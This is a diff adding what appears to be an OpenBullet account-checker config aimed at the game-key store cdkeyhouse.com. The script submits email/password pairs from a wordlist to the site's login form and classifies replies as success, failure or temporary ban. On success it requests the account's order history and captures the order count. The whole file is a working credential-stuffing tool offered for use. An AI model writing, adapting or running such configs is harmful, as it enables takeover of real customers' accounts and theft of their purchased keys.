@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "CDKeyHouse",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-11T05:48:02.4822991-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.cdkeyhouse.com/authentication" 
+  CONTENT "email=<USER>&passwd=<PASS>&back=my-account.php&SubmitLogin=Log+in" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "My Game Keys" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password" 
+    KEY "Authentication failed" 
+  KEYCHAIN Ban OR 
+    KEY "has banned you temporarily" 
+
+REQUEST GET "https://www.cdkeyhouse.com/order-history" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "You have" "any orders" -> CAP "Orders" "You have " "any orders " 
+
